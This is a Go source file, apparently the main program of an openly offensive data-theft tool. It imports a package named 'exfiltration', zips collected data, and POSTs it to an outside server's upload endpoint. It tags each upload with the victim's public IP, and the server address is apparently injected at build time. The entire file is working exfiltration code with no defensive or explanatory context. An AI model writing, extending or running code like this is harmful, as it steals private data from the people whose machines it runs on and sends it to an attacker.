package main

import (
	"net/http"
	"github.com/0xnahim/talpido/exfiltration"
	"log"
	"bytes"
	"fmt"
)
var server string


func sendData() {
	
	url := fmt.Sprintf("%s/upload", server)
	data := exfiltration.MakeZip()
	
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
	
	if err != nil {
		log.Fatal(err)
	}
	req.Header.Set("IP", exfiltration.GetPublicIP())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

}

func main() {
	sendData()
}
